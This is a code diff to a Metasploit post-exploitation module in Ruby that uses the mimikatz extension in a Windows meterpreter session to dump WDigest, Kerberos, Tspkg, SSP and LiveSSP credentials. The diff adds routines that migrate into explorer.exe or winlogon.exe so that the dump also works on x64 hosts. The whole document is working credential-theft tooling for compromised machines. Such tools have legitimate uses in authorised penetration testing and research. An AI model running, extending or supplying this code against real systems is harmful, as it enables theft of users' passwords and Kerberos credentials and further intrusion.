@@ -22,62 +22,70 @@ class Metasploit3 < Msf::Post
       'License'      => MSF_LICENSE,
       'Author'       => ['Ben Campbell'],
       'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter' ]
+      'SessionTypes' => ['meterpreter']
     ))
   end
 
   def run
     if sysinfo.nil?
-      print_error("This module is only available in a windows meterpreter session.")
+      print_error('This module is only available in a windows meterpreter session.')
       return
     end
 
     print_status("Running module against #{sysinfo['Computer']}")
-
-    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
-      print_error("x64 platform requires x64 meterpreter and mimikatz extension")
-      return
+    if (client.platform =~ /x86/) && (client.sys.config.sysinfo['Architecture'] =~ /x64/)
+      print_status('Running on x86 trying to migrate to a x64 process')
+      processes = client.sys.process.get_processes
+      uid = client.sys.config.getuid
+      possible_procs = gather_procs(processes, uid)
+      possible_procs.each do |proc|
+        break if attempt_migration(proc['pid'])
+      end
+      if client.platform =~ /x86/
+        print_error("Couldn't migrate to x64 process")
+        return
+      end
     end
 
     unless client.mimikatz
-      vprint_status("Loading mimikatz extension...")
+      vprint_status('Loading mimikatz extension...')
       begin
-        client.core.use("mimikatz")
+        client.core.use('mimikatz')
       rescue Errno::ENOENT
-        print_error("This module is only available in a windows meterpreter session.")
+        print_error('This module is only available in a windows meterpreter session.')
         return
       end
     end
 
     unless is_system?
-      vprint_warning("Not running as SYSTEM")
-      debug = client.mimikatz.send_custom_command("privilege::debug")
+      vprint_warning('Not running as SYSTEM')
+      debug = client.mimikatz.send_custom_command('privilege::debug')
       if debug =~ /Not all privileges or groups referenced are assigned to the caller/
-        print_error("Unable to get Debug privilege")
+        print_error('Unable to get Debug privilege')
         return
       else
-        vprint_status("Retrieved Debug privilege")
+        vprint_status('Retrieved Debug privilege')
       end
     end
 
-    vprint_status("Retrieving WDigest")
+    vprint_status('Retrieving WDigest')
     res = client.mimikatz.wdigest
-    vprint_status("Retrieving Tspkg")
+    vprint_status('Retrieving Tspkg')
     res.concat client.mimikatz.tspkg
-    vprint_status("Retrieving Kerberos")
+    vprint_status('Retrieving Kerberos')
     res.concat client.mimikatz.kerberos
-    vprint_status("Retrieving SSP")
+    vprint_status('Retrieving SSP')
     res.concat client.mimikatz.ssp
-    vprint_status("Retrieving LiveSSP")
+    vprint_status('Retrieving LiveSSP')
     livessp = client.mimikatz.livessp
     unless livessp.first[:password] =~ /livessp KO/
       res.concat client.mimikatz.livessp
     else
-      vprint_error("LiveSSP credentials not present")
+      vprint_error('LiveSSP credentials not present')
     end
 
     table = Rex::Ui::Text::Table.new(
-      'Header' => "Windows SSO Credentials",
+      'Header' => 'Windows SSO Credentials',
       'Indent' => 0,
       'SortIndex' => 0,
       'Columns' =>
@@ -99,7 +107,7 @@ class Metasploit3 < Msf::Post
 
   def report_creds(domain, user, pass)
     return if (user.empty? or pass.empty?)
-    return if pass.include?("n.a.")
+    return if pass.include?('n.a.')
 
     # Assemble data about the credential objects we will be creating
     credential_data = {
@@ -133,7 +141,6 @@ class Metasploit3 < Msf::Post
     create_credential_login(login_data)
   end
 
-
   def is_system_user?(user)
     system_users = [
       /^$/,
@@ -150,8 +157,31 @@ class Metasploit3 < Msf::Post
       /^LOCAL SYSTEM$/
     ]
 
-    return system_users.find{|r| user.match(r)}
+    return system_users.find { |r| user.match(r) }
   end
 
-end
+  def gather_procs(processes, uid)
+    possible_procs = []
+    processes.each do |proc|
+      if proc['name'] == 'explorer.exe' && proc['user'] == uid
+        possible_procs << proc
+      elsif proc['name'] == 'explorer.exe' && proc['user'] != uid
+        possible_procs << proc
+      elsif proc['name'] == 'winlogon.exe'
+        possible_procs << proc
+      end
+    end
+    possible_procs
+  end
 
+  def attempt_migration(target_pid)
+    print_good("Migrating to #{target_pid}")
+    client.core.migrate(target_pid)
+    print_good("Successfully migrated to process #{target_pid}")
+    return true
+  rescue ::Exception => e
+    print_error('Could not migrate in to process.')
+    print_error(e.to_s)
+    return false
+  end
+end
